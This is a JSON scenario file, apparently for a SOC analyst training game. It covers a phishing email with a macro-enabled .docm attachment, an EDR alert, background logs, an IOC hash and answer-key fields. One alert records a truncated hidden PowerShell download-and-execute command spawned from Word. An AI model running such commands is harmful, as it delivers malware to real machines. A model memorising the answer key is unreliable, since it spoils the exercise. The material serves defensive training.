@@ -1,0 +1,147 @@
+{
+  "id": "sc-003",
+  "title": "Shift 003 - Afternoon Shift",
+  "category": "Malware",
+  "outcome": "true_positive",
+  "difficulty": "Tier 1",
+  "briefing": "A user opened an email attachment.",
+  "startTime": "16:00:00",
+  "context": {
+    "change_calendar": [],
+    "notices": []
+  },
+  "assets": {
+    "users": {
+      "h.nabil": "LEGAL-PC-15"
+    }
+  },
+  "alerts": [
+    {
+      "at": 0,
+      "severity": "Medium",
+      "rule": "Email: macro-enabled attachment",
+      "source": "Email Gateway",
+      "host": "LEGAL-PC-15",
+      "user": "h.nabil",
+      "summary": "Macro-enabled attachment Shipment_Details.docm delivered from account-update-check.com",
+      "details": {
+        "email_from": "accounts@account-update-check.com",
+        "email_to": "h.nabil@corp.example",
+        "subject": "Invoice overdue - review attached",
+        "file_name": "Shipment_Details.docm",
+        "file_hash": "1612aa1bb82fe41102f39bbad00825baa71f41b1c676223e9139ee3081be7ecb",
+        "action_taken": "Delivered",
+        "raw_log": "mail from=accounts@account-update-check.com attach=Shipment_Details.docm macro=yes spf=softfail"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Medium",
+        "escalate": false,
+        "mitre": "T1566.001"
+      },
+      "id": "A-1001"
+    },
+    {
+      "at": 2,
+      "severity": "Medium",
+      "rule": "EDR: Office spawned command interpreter",
+      "source": "EDR",
+      "host": "LEGAL-PC-15",
+      "user": "h.nabil",
+      "summary": "WINWORD.EXE spawned cmd.exe on LEGAL-PC-15; EDR blocked the process tree",
+      "details": {
+        "host_ip": "10.15.99.206",
+        "process": "cmd.exe",
+        "parent_process": "WINWORD.EXE",
+        "file_name": "Shipment_Details.docm",
+        "command_line": "cmd.exe /c powershell -w hidden -c IEX(New-Object Net.WebClient)...",
+        "action_taken": "Blocked (process killed)",
+        "raw_log": "EDR block parent=WINWORD.EXE child=cmd.exe host=LEGAL-PC-15"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Medium",
+        "escalate": false,
+        "mitre": "T1059"
+      },
+      "id": "A-1002"
+    }
+  ],
+  "logs": [
+    {
+      "t": "15:59:01",
+      "src": "email",
+      "host": "SALES-PC-11",
+      "user": "m.khaled",
+      "msg": "Delivered: weekly IT bulletin from it-bulletin@corp.example"
+    },
+    {
+      "t": "15:59:48",
+      "src": "windows",
+      "host": "HR-PC-20",
+      "user": "h.hassan",
+      "msg": "4624 logon type 2 (interactive) success"
+    },
+    {
+      "t": "15:59:53",
+      "src": "windows",
+      "host": "ENG-PC-28",
+      "user": "n.saleh",
+      "msg": "4624 logon type 2 (interactive) success"
+    },
+    {
+      "t": "16:02:00",
+      "src": "edr",
+      "host": "LEGAL-PC-15",
+      "user": "h.nabil",
+      "msg": "Blocked: WINWORD.EXE -> cmd.exe (process tree terminated)"
+    },
+    {
+      "t": "16:02:05",
+      "src": "dns",
+      "host": "IT-PC-05",
+      "user": "a.saleh",
+      "msg": "query updates.contoso-tools.com A NOERROR"
+    },
+    {
+      "t": "16:09:41",
+      "src": "proxy",
+      "host": "HR-PC-14",
+      "user": "m.samir",
+      "msg": "GET https://cdn.fabrikam-cdn.net/lib.js 200"
+    },
+    {
+      "t": "16:19:03",
+      "src": "email",
+      "host": "HR-PC-38",
+      "user": "h.ibrahim",
+      "msg": "Delivered: weekly IT bulletin from it-bulletin@corp.example"
+    },
+    {
+      "t": "16:22:07",
+      "src": "windows",
+      "host": "FIN-PC-17",
+      "user": "s.saleh",
+      "msg": "4624 logon type 2 (interactive) success"
+    },
+    {
+      "t": "16:28:11",
+      "src": "edr",
+      "host": "FIN-PC-29",
+      "user": "k.gamal",
+      "msg": "Scheduled scan completed, 0 detections"
+    }
+  ],
+  "iocs": {
+    "1612aa1bb82fe41102f39bbad00825baa71f41b1c676223e9139ee3081be7ecb": {
+      "type": "hash",
+      "reputation": "malicious",
+      "note": "Malicious macro downloader document"
+    }
+  },
+  "expected_actions": [
+    "delete_email",
+    "block_hash:1612aa1bb82fe41102f39bbad00825baa71f41b1c676223e9139ee3081be7ecb",
+    "scan_host"
+  ]
+}
